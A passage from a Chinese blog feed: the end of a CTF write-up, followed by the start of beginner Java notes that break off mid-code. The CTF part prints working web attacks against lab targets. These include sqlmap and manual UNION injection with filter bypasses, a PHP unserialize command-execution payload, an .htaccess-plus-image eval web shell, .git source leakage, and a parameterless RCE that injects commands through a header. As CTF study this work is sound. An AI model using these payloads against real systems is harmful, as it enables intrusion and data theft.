class="hljs-number">81</span>/?id=TMP0919 --current-db<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf --tables<br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag --<span class="hljs-built_in">columns</span><br>python sqlmap.py -u http://ec81de9a-<span class="hljs-number">5b56</span>-<span class="hljs-number">4796</span>-99be-f0810ee00a44.node4.buuoj.cn:<span class="hljs-number">81</span>/?id=TMP0919 -D ctf -T here_is_flag -C flag --dump<br></code></pre></td></tr></table></figure><p><code>flag:flag&#123;76715552-3304-4be1-b5e7-235d60421e41&#125;</code></p><p>后面看了下wp，因为太久没做这种手注了也试了试：</p><p>先判断数字型还是字符型注入：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">--+</span>    正常回显，初步猜测字符型注入<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; And <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">--+</span>   正常回显，字符型注入  <span class="hljs-comment">// and 被过滤了，试了试AND结果发现成功绕过</span><br>如果想在URL中用#这个注释符要编码成<span class="hljs-operator">%</span><span class="hljs-number">23</span>,太久没做SQL注入了，一开始把这茬忘了。<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span>TMP0919&#x27; oRdeR by <span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   判断几列<br><span class="hljs-operator">/?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=-</span><span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-operator">--+</span>   判断回显位，这五个数字同时回显<br>后面就是正常手注过程。<br>一开始以为直接用preg_match的 <span class="hljs-operator">/</span>i模式把大小写都正则匹配掉了，后面发现可以用大小写绕过。本来还想尝试ASCII编码绕过，弄了很久都没成功，找了下发现这种方式在某些版本的mysql中不能用了。。<br>https<span class="hljs-operator">:</span><span class="hljs-comment">//xz.aliyun.com/t/10594#toc-6</span><br></code></pre></td></tr></table></figure><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-comment">// private属性，序列化后会在属性前后分别加空(\00,转成URL%00)，构建payload要用rawurlencode</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) //<span class="hljs-title">__destruct</span>魔术方法，反序列化自动调用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//简单的过滤，想读文件的化可以用c&#x27;&#x27;at，ca$&#123;Z&#125;t等绕过</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//看看当前文件夹下</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//当前文件夹下结果：index.php</span><br></code></pre></td></tr></table></figure><p><img src="/img/unser1.png" alt="unser1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ca&#x27;&#x27;t /th1s_1s_fffflllll4444aaaggggg&quot;</span>; <span class="hljs-comment">//看了wp发现直接用head读也行</span><br>    &#125;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;aa2dff68-42ce-46b0-a7d7-bb1d8a524896&#125;</code></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/img/upload2.png" alt="upload2"></p><p>肯定比week1过滤更严格了，上传htaccess.发现上传成功，内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test1.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>再上传<code>test1.png</code>，配置文件的存在可以把<code>test1.png</code>当成<code>php</code>文件，以构造一句话木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;viper&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;notbad&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传路径直接回显就不用<code>F12</code>去找了，可以先访问一下看是否访问成功，然后直接用蚁剑连就能拿<code>flag</code>：</p><p><code>flag&#123;99c580dd-c75e-41f2-89da-4741ab19f655&#125;</code></p><p>后面看wp知道它是检查了文件内容：<code>&lt;?</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>进环境发现是敏感信息泄露，直接用<code>dirsearch</code>扫：</p><p><code>dirsearch -u http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/RCE1.png" alt="RCE1"></p><p><code>.git</code>泄露，切换成根用户<code>python2 GitHack.py http://635180c1-325b-4912-8f12-65571659c74b.node4.buuoj.cn:81/.git</code></p><p>发现两个文件，一个<code>index.php</code>一个<code>bo0g1pop.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有个<code>((?R)?\)</code>，典型无参数RCE。</p><p>无参数RCE用的比较多的方法有<code>getallheaders()</code>，<code>get_defined_var()</code>,<code>session_id</code>。这题过滤了<code>get_defined_vars</code>，所以尝试用另外两种。</p><p>先<code>print_r(getallheaders())</code>看看以数组形式返回的包头是什么顺序的，正序还是倒叙？都返回哪些？</p><p><code>/bo0g1pop.php/?star=print_r(getallheaders());</code></p><p><img src="/img/rce22.png" alt="rce22"></p><p>正序回显以上内容，构建<code>payload</code>:</p><p><code>?star=eavl(next(getallheaders()));</code> 并把User-Agent头改成<code>system(&#39;ls&#39;);</code></p><p><img src="/img/rce4.png" alt="rce4"></p><p><img src="/img/rce3.png" alt="rce3"></p><p>后面命令改成<code>cat /flag</code>即可</p><p>虽然Host头第一位就回显了，但不能通过改Host头去执行命令，否则会弹400。或者利用<code>array_reverse</code>改最后回显那个<code>X-Forwarded-Proto</code>头也行</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java基础学习笔记</title>
    <link href="/2023/10/10/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/"/>
    <url>/2023/10/10/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/</url>
    
    <content type="html"><![CDATA[<p>一些基础知识，长期更新</p><span id="more"></span><hr><blockquote><p>一些有关java的基础学习笔记，之前一直在书上记，后面想想还是不太方便，越来越喜欢Typora了</p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//定义变量，再进行输出</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        System.out.println(a);<br>        <span class="hljs-comment">//变量参与计算</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        System.out.println(a + b);<br>        <span class="hljs-comment">//重新定义变量的值</span><br>        a = <span class="hljs-number">50</span>;<br>        System.out.println(a + b);<br>        <span class="hljs-comment">//可以一条语句定义多个变量</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>, f = <span class="hljs-number">200</span>, g = <span class="hljs-number">300</span>;<br>        System.out.println(e);<br>        System.out.println(f);<br>        System.out.println(g);<br>        <span class="hljs-comment">//变量在使用前必须赋值</span><br>        <span class="hljs-type">int</span> r;<br>        r = <span class="hljs-number">900</span>;<br>        System.out.println(r);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：</span><br><span class="hljs-number">10</span><br><span class="hljs-number">30</span><br><span class="hljs-number">70</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br><span class="hljs-number">300</span><br> <br></code></pre></td></tr></table></figure><p>变量注意事项：</p><ul><li>只能存一个值</li><li>变量名不允许重复定义(可以修改值)</li><li>一条语句可以定义多个变量</li><li>变量在使用之前一定要赋值</li><li>变量的作用域范围</li></ul><h3 id="计算机的存储规则"><a href="#计算机的存储规则" class="headerlink" title="计算机的存储规则"></a>计算机的存储规则</h3><ul><li>Text 文本</li><li>image 图片</li><li>Sound 声音</li></ul><p>计算机中任意数据都是以二进制形式存储的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*JDK7</span><br><span class="hljs-comment">二进制：0b开头</span><br><span class="hljs-comment">八进制：0开头</span><br><span class="hljs-comment">十六进制：0x开头*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-number">017</span>);<span class="hljs-comment">//15</span><br>        System.out.println(<span class="hljs-number">0b1111111</span>);<span class="hljs-comment">//127</span><br>        System.out.println(<span class="hljs-number">0xa7</span>);<span class="hljs-comment">//167</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><img src="/img/javabiji1.png" alt="javabiji1"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">127</span>;<br>        <span class="hljs-type">short</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">40L</span>;<span class="hljs-comment">//若要定义Long类型的变量，在数据后加大写或小写的l</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.1F</span>;<span class="hljs-comment">//若要定义float类型的变量，后面加个大写或小写的f</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-number">2.2</span>;<br>        <span class="hljs-type">char</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;任&#x27;</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>Java中数据类型分为：基本数据类型，引用数据类型。</p></li><li><p>基本数据类型：四类八种。</p></li><li><p>注意byte的取值范围：-128 – 127</p></li><li><p>整数和小数取值范围大小关系：double &gt; float &gt; long &gt; int &gt; short &gt; byte</p></li><li><p>Long类型变量：L后缀，大小写均可</p></li><li><p>float类型变量：F后缀，大小写均可</p></li></ul><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><blockquote><p>就是给类、方法、变量等起的名字。</p></blockquote><ul><li>可以由数字、字母、下划线(_)和美元符($)组成。</li><li>不能以数字开头</li><li>不能是关键字</li><li>区分大小写</li></ul><p><img src="/img/javabiji2.png" alt="javabiji2"></p><h3 id="键盘录入"><a href="#键盘录入" class="headerlink" title="键盘录入"></a>键盘录入</h3><blockquote><p>Scanner这个类可以接收键盘输入</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sc.nextInt();<br></code></pre></td></tr></table></figure><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <br>        System.out.println(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> sc.nextInt();<span class="hljs-comment">//调用Scanner对象的nextInt方法来读取一个整数</span><br><br>        System.out.println(i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>键盘输入两个整数并求和：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个整数i：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请再输入一个整数j：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">Jieguo</span> <span class="hljs-operator">=</span> num1 + num2;<br><br>        System.out.println(<span class="hljs-string">&quot;两数之和为：&quot;</span> + Jieguo);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><blockquote><p>算数运算符：加减乘除取模&#x2F;取余(%)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>);<br><br>        System.out.println(<span class="hljs-number">2</span> - <span class="hljs-number">1</span>);<br><br>        System.out.println(<span class="hljs-number">2</span> * <span class="hljs-number">2</span>);<br><br>        System.out.println(<span class="hljs-number">9</span> / <span class="hljs-number">3</span>);<br><br>        System.out.println(<span class="hljs-number">10</span> / <span class="hljs-number">3</span>);<br><br>        System.out.println(<span class="hljs-number">10.0</span> / <span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//取模应用场景：判断是否可以整除，</span><br>        System.out.println(<span class="hljs-number">9</span> % <span class="hljs-number">2</span>);<br>        <span class="hljs-comment">//整数参与运算，结果只能是整数</span><br>        <span class="hljs-comment">//注意，如果有小数参与运算，结果可能是不精确的</span><br><br>        System.out.println(<span class="hljs-number">1.1</span> + <span class="hljs-number">1.01</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/*结果：</span><br><span class="hljs-comment">2</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">4</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">2.1100000000000003</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//要求在键盘录入一个三位数，将其拆分为个位、十位、百位后，打印出来</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个三位数num1：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">baiwei</span> <span class="hljs-operator">=</span> (num1 - (num1 % <span class="hljs-number">100</span>)) / <span class="hljs-number">100</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">shiwei</span> <span class="hljs-operator">=</span> ((num1 - baiwei * <span class="hljs-number">100</span>) - (num1 - baiwei *<span class="hljs-number">100</span>) % <span class="hljs-number">10</span>) / <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">gewei</span> <span class="hljs-operator">=</span> (num1 - baiwei *<span class="hljs-number">100</span> - shiwei * <span class="hljs-number">10</span>);<br><br><br>        System.out.println(<span class="hljs-string">&quot;百位是：&quot;</span> + baiwei);<br><br>        System.out.println(<span class="hljs-string">&quot;十位是：&quot;</span> + shiwei);<br><br>        System.out.println(<span class="hljs-string">&quot;个位是：&quot;</span> + gewei);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//吗的我写麻烦了。。唉</span><br></code></pre></td></tr></table></figure><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//数字相加</span><br><br></code></pre></td></tr></table></figure><p>类型转换：</p><ul><li>隐式转换(自动类型提升)：取值范围小的数值转换为取值范围大的。</li></ul><p><img src="/img/javalearn4.png" alt="javalearn4"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span 